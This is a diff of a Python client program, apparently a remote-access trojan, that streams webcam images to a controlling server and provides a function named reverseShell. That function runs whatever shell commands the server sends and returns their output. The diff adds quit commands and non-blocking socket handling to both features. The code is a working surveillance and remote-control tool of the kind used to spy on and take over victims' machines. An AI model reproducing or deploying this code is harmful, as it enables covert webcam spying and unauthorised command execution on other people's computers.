@@ -7,14 +7,15 @@ import pickle
 import struct
 import threading
 from queue import Queue
+import errno
 
 NUMBER_OF_THREADS = 2
 JOB_NUMBER = [1,2]
 queue = Queue()
 
 """
-Program clienta musi dostać informacje od serwera o zakończeniu działania pętli poszczególnych funkcji.
-Brak przerwania ich uniemożliwia zmianę wykonywanych operacji ze strony serwera
+Funkcja camera musi nasłuchiwać komendy zakończena od strony serwera.
+Jeśli komenda nie występuje to wysyła obraz z kamery do serwera.
 """
 
 
@@ -28,14 +29,19 @@ def camera(client_socket):
     cam.set(3, 720)
     cam.set(4, 480)
     img_counter = 0
+    client_socket.setblocking(0)
     while True: 
-        ret, frame = cam.read()
-        result, frame = cv2.imencode('.jpg', frame, encode_param)
-        data = pickle.dumps(frame, 0)
-        size = len(data)
-        client_socket.sendall(struct.pack(">L", size) + data)
-        img_counter += 1
-
+        command = client_socket.recv(1024)
+        if not command:
+            ret, frame = cam.read()
+            result, frame = cv2.imencode('.jpg', frame, encode_param)
+            data = pickle.dumps(frame, 0)
+            size = len(data)
+            client_socket.sendall(struct.pack(">L", size) + data)
+            img_counter += 1
+        else:
+            if command[:1].decode("utf-8") == 'q':
+                break
     cam.release()
 
 def reverseShell(client_socket):
@@ -43,6 +49,8 @@ def reverseShell(client_socket):
         data = client_socket.recv(1024)
         if data[:2].decode("utf-8") == 'cd':
             os.chdir(data[3:].decode("utf-8"))
+        if data[:1].decode("utf-8") == 'q':
+            break
         if len(data) > 0:
             command = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             output_bytes = command.stdout.read() + command.stderr.read()
@@ -51,6 +59,8 @@ def reverseShell(client_socket):
 
 def waitForInstructions(client_socket):
     while True:
+        client_socket.setblocking(1)
+        print("Waiting for instructions")
         data = client_socket.recv(1024)
         if len(data) > 0:
             command = data.decode("utf-8")
